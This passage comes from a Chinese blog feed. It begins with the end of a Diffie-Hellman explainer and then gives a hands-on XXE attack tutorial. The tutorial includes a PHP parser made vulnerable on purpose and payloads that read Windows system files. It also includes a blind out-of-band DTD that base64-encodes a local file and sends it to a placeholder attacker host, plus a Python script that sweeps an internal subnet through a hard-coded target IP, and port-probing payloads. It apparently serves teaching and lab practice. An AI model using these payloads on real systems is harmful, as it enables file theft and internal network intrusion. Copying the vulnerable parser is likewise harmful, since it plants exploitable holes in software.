data-src="https://pic3.zhimg.com/80/5d668818881609c8543e6efa7c0d6af1_720w.jpg" alt=""></p><p>上图很经典<br>它的数学基础就是离散对数这个数学难题。用它进行密钥交换的过程简述如下： </p><p>选取两个大数p和g并公开，其中p是一个素数，g是p的一个<strong>模p本原单位根(primitive root module p)</strong>，所谓<strong>本原单位根</strong>就是指在<strong>模p乘法运算下</strong>，g的1次方，2次方……(p-1)次方这p-1个数互不相同，并且取遍1到p-1； </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于Alice(其中的一个通信者)，随机产生一个整数a，a对外保密，计算Ka &#x3D; g^a mod p，将Ka发送给Bob；</span><br><span class="line"></span><br><span class="line">对于Bob(另一个通信者)，随机产生一个整数b，b对外保密，计算Kb &#x3D; g^b mod p，将Kb发送给Alice； </span><br><span class="line"></span><br><span class="line">在Alice方面，收到Bob送来的Kb后，计算出密钥为：key &#x3D; Kb^a mod p &#x3D; g^(b*a) mod p mod p； </span><br><span class="line"></span><br><span class="line">对于Bob，收到Alice送来的Ka后，计算出密钥为：key &#x3D; Ka ^ b mod p &#x3D; g^(a*b) mod p mod p。</span><br><span class="line"></span><br><span class="line">攻击者知道p和g，并且截获了Ka和Kb，但是当它们都是非常大的数的时候，依靠这四个数来计算a和b非常困难，这就是离散对数数学难题。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）Alice与Bob确定两个大素数n和g，这两个数不用保密 </span><br><span class="line">（2）Alice选择另一个大随机数x，并计算A如下：A&#x3D;g^xmod n </span><br><span class="line">（3）Alice将A发给Bob </span><br><span class="line">（4）Bob  选择另一个大随机数y，并计算B如下：B&#x3D;g^ymod n </span><br><span class="line">（5）Bob将B发给Alice </span><br><span class="line">（6）计算秘密密钥K1如下：K1&#x3D;B^xmod n </span><br><span class="line">（7）计算秘密密钥K2如下：K2&#x3D;A^ymod n  K1&#x3D;K2，因此Alice和Bob可以用其进行加解密</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 对称加密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞原理</title>
      <link href="/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
      <url>/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><p>xxe漏洞主要针对web-service危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等．首先存在漏洞的web服务一定是存在xml传输数据的，可以在http头的content-type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）．或者一些常见的采用xml的java服务配置文件（spring，struts2）．不过现实中存在的大多数xxe漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机．</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul><li>XML</li><li>DTD</li></ul><h4 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h4><p>XML 指可扩展标记语言（eXtensible Markup  Language）。</p><p>XML 被设计用来传输和存储数据。</p><p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p><p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。（这里不解释js如何读取xml数据）</p><h4 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><p>这是一个xml结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;                &#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;message&gt;                                               &#x2F;&#x2F;定义一个根元素</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;                             &#x2F;&#x2F;定义子元素receiver的内容为Myself</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;                                &#x2F;&#x2F;同上</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;                            &#x2F;&#x2F;同上</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;                      &#x2F;&#x2F;同上</span><br><span class="line">&lt;&#x2F;message&gt;                                              &#x2F;&#x2F;根元素结尾标签</span><br></pre></td></tr></table></figure><p>如果使用DTD来定义：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;                                   &#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [                                     &#x2F;&#x2F;定义一个根元素</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;      &#x2F;&#x2F;定义根元素包含的子元素，通过圆括号定义</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;                           &#x2F;&#x2F;定义子元素(#PCDATA)表示只有数据的元素</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;                             &#x2F;&#x2F;同上 </span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;紧跟在XML标头之后，是文档类型声明，通常称为&#96;DOCTYPE&#96;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;DOCTYPE声明后跟DTD的主体，可以在主体中声明 &quot;元素&quot;，&quot;属性&quot;，&quot;实体&quot; 和 &quot;符号&quot; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方括号[]包含一个称为内部子集的可选实体声明列表。</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;带有一个或多个子元素的元素通过圆括号中的子元素名进行声明</span><br></pre></td></tr></table></figure><p>DTD语法<br>所有DTD元素声明都有这种一般形式 </p><figure class="highlight plain"><figcaption><span>elementname (content)></span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT elementname (content)&gt;</span><br></pre></td></tr></table></figure><ul><li><p><code>ELEMENT</code>声明用于指示要定义元素的解析器。</p></li><li><p><code>elementname</code>是定义的元素名称(也称为通用标识符)。</p></li><li><p><code>content</code>定义了元素中可以包含的内容(如果有的话)。</p></li></ul><h3 id="什么是实体注入"><a href="#什么是实体注入" class="headerlink" title="什么是实体注入"></a>什么是实体注入</h3><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 XML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明</span><br><span class="line">&#x2F;&#x2F;通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><h4 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h4><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)<font color=red>只有在 DTD 文件中，参数实体的声明才能引用其他实体</font><br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p><strong>抛砖：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h4 id="我们能做什么？"><a href="#我们能做什么？" class="headerlink" title="我们能做什么？"></a>我们能做什么？</h4><p>上面疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><h3 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a><strong>实验一：有回显读本地敏感文件(Normal XXE)</strong></h3><p>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p><p>本地服务器上放上解析 XML 的 php 代码：</p><p><strong>示例代码：</strong></p><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);             &#x2F;&#x2F;关闭禁用xml外部实体</span><br><span class="line">    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); </span><br><span class="line">    $dom &#x3D; new DOMDocument();                         &#x2F;&#x2F;创建xml对象</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     </span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);               </span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;file_get_contents() 函数把整个文件读入一个字符串中。php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。</span><br><span class="line">这里相当于获取post过去的xml代码</span><br><span class="line">&#x2F;&#x2F;loadxml加载xml代码</span><br><span class="line">&#x2F;&#x2F;LIBXML_NOENT: 将 XML中的实体引用替换成对应的值</span><br><span class="line">&#x2F;&#x2F;LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span><br><span class="line">&#x2F;&#x2F;simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/3MhyU4U.png" alt=""></p><p>成功读取system.in文件内容</p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/LxYOrGA.png" alt=""></p><p><strong>结果如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/XGXPp9F.png" alt=""></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下：</p><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br>“ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure><p>可以输入任意字符除了 ]]&gt; 不能嵌套</p><p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 <code>&lt;![CDATA[&quot; 和 &quot;]]&gt;</code>,但是好像没有任何语法告诉我们字符串能拼接的。</p><p><strong>使用参数实体引用其他实体</strong></p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;            &#x2F;&#x2F;引用start，goodies，end实体内容，CDATA输出</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;参数实体的作用是作为DTD中的元素的条件控制。参数实体定义以%作为开头，引用也以%开头，以;结尾。一般实体的定义无%开头，引用以&amp;开头，以;结尾</span><br></pre></td></tr></table></figure><p><strong>结果如图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/rPu8UmV.png" alt=""></p><h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><h4 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a>新的问题出现</h4><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><h4 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a>新的解决方法</h4><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p><p><strong>xml.php</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64 encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;因为实体的值中不能有 %, 所以讲send前的 “%” 转换成html实体编码 “&amp;#37”;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>结果如图：</strong></p><p>环境问题，先不搭了。。。。。。。</p><p><strong>整个调用过程：</strong></p><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件（file传入到send的过程中已经执行，传入到send是已经得到的值），然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><h4 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a>新的利用：</h4><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p><p><strong>如图所示:</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/QsNmhnD.png" alt=""></p><p>PHP在安装扩展以后还能支持的协议：</p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/yagSMz8.png" alt=""></p><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p><h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a>实验三：HTTP 内网主机探测</h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p><strong>下面是一个探测脚本的实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;&#x2F;stuff&gt;</span><br><span class="line">#&lt;&#x2F;xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">    x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;34.200.157.128&#x2F;CUSTOM&#x2F;NEW_XEE.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text</span><br><span class="line">    coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; str(i)</span><br><span class="line">        ip &#x3D; &#39;10.0.0.&#39; + i</span><br><span class="line">        string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p><strong>返回结果：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/iqZlZdf.png" alt=""></p><h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a>实验四：HTTP 内网主机端口扫描</h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p><p><strong>比如我们传入：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure><p><strong>返回结果：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure><p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p><p><strong>如下图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/HpfpmxB.png" alt=""></p><p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p><h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 